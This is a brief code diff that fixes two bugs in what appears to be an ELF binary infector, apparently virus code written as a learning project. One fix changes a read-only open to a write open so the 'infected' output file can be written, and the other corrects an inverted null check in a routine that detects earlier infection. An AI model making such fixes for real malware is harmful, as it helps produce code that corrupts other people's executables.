@@ -117,7 +117,7 @@ int write_infected_file(const char *output_path, void *map, size_t size)
     if (!output_path || !map || size == 0)
         return -1;
     
-    fd = open(output_path, O_CREAT | O_RDONLY | O_TRUNC, 0755);
+    fd = open(output_path, O_CREAT | O_WRONLY | O_TRUNC, 0755);
     if (fd < 0)
     {
         perror("open output file");
@@ -145,7 +145,7 @@ int already_infected(void *map, ElfInfo *info)
 {
     Elf64_Ehdr *eh;
 
-    if(!map || info)
+    if(!map || !info)
         return (0);
     
     eh = (Elf64_Ehdr *)map;
